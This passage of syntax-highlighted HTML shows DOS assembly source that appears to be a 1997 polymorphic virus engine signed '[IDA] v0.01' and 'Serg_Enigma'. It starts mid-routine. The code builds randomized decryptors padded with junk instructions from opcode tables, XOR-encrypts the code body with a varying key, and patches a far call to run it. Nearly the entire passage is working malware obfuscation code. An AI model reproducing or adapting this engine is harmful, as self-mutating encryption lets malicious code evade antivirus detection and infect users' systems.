        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">m2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">LodSb</span><span class="sc0">
        </span><span class="sc6">StoSb</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Gen_Gar</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D0lng</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">one_com</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D0lng</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0"> </span><span class="sc1">;######################## 2</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">m1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">LodSb</span><span class="sc0">
        </span><span class="sc6">StoSb</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Gen_Gar</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_buf</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">LodSw</span><span class="sc0">
        </span><span class="sc6">StoSw</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Gen_Gar</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">cm_off</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">LodSb</span><span class="sc0">
        </span><span class="sc6">StoSb</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Gen_Gar</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0"> </span><span class="sc1">;###################### 3</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_cmp</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">LodSw</span><span class="sc0">
        </span><span class="sc6">StoSw</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Gen_Gar</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Jx1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng4</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0"> </span><span class="sc1">;###### Jb / Loop ###### 4</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">LodSw</span><span class="sc0">
        </span><span class="sc6">StoSw</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Gen_Gar</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_last</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_rnd</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0"> </span><span class="sc1">; cmp xx,offset end</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">],</span><span class="sc5">lng</span><span class="sc4">+</span><span class="sc2">0fdh</span><span class="sc0"> </span><span class="sc1">; not crypt last 3 byte of ID </span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng4</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng4</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Bl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Bl</span><span class="sc4">,</span><span class="sc8">Al</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">],</span><span class="sc8">Bl</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">lng</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Sc</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">Rep</span><span class="sc0">     </span><span class="sc6">MovSb</span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dat</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">lng_II</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_rnd</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc2">109h</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0"> </span><span class="sc1">;###############   ##############</span><span class="sc0">
</span><span class="sc5">Drug</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc12">'SE'</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">Drug</span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc5">D_last</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">],</span><span class="sc2">0cbh</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ds</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">

        </span><span class="sc6">Pushf</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09ah</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">new_seg</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc0">
        </span><span class="sc6">Popf</span><span class="sc0">

        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ds</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_size</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_last</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">],</span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">Lng</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D_lng2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">],</span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">one_b_op</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc0">                    </span><span class="sc1">; Inc Ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">041h</span><span class="sc0">                    </span><span class="sc1">; Inc Cx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">042h</span><span class="sc0">                    </span><span class="sc1">; inc dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">043h</span><span class="sc0">                    </span><span class="sc1">; inc bx*</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">045h</span><span class="sc0">                    </span><span class="sc1">; inc bp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">046h</span><span class="sc0">                    </span><span class="sc1">; inc si*</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">047h</span><span class="sc0">                    </span><span class="sc1">; inc di*</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">048h</span><span class="sc0">                    </span><span class="sc1">; dec ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">049h</span><span class="sc0">                    </span><span class="sc1">; dec cx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04ah</span><span class="sc0">                    </span><span class="sc1">; dec dx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04bh</span><span class="sc0">                    </span><span class="sc1">; dec bx*</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04dh</span><span class="sc0">                    </span><span class="sc1">; dec bp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04eh</span><span class="sc0">                    </span><span class="sc1">; dec si*</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04fh</span><span class="sc0">                    </span><span class="sc1">; dec di*</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">     
        </span><span class="sc6">nop</span><span class="sc0">     
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">     
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">                    </span><span class="sc1">; Nop</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">026h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03Eh</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">042h</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02Eh</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">log_op</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0"> </span><span class="sc1">;0        Not b,[Si]</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc0"> </span><span class="sc1">;1        Not b,[Di]</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">04bh</span><span class="sc0"> </span><span class="sc1">;2        Not b,[Bx]</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0"> </span><span class="sc1">;3        Neg b,[Si]</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Dh</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc0"> </span><span class="sc1">;4        Neg b,[Di]</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">04bh</span><span class="sc0"> </span><span class="sc1">;5        Neg b,[Bx]</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0"> </span><span class="sc1">;6        Xor w,[Si],Ax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc0"> </span><span class="sc1">;7        Xor w,[Di],Ax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">04bh</span><span class="sc0"> </span><span class="sc1">;8        Xor w,[Bx],Ax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0"> </span><span class="sc1">;9        Xor w,[Si],Cx</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc0"> </span><span class="sc1">;10       Xor w,[Di],Cx</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">04bh</span><span class="sc0"> </span><span class="sc1">;11       Xor w,[Bx],Cx</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0"> </span><span class="sc1">;12       Xor w,[Si],Dx</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc0"> </span><span class="sc1">;13       Xor w,[Di],Dx</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">04bh</span><span class="sc0"> </span><span class="sc1">;14       Xor w,[Bx],Dx</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0"> </span><span class="sc1">;15       Xor w,[Si],Bx</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Dh</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc0"> </span><span class="sc1">;16       Xor w,[Di],Bx</span><span class="sc0">
</span><span class="sc5">Jx1</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">               </span><span class="sc1">; Jb yy</span><span class="sc0">
</span><span class="sc1">;Jx2     db      0e2h, 00h               ; Loop yy</span><span class="sc0">

</span><span class="sc5">copyright</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'[IDA] v0.01'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'Serg_Enigma'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;message                db      ' íâ® ¥éñ ­¥ ¢áñ... 1997£'</span><span class="sc0">
</span><span class="sc5">D0lng</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">D_lng</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; ¬¥é¥­¨¥ ­  Mov ??,???? = 1</span><span class="sc0">
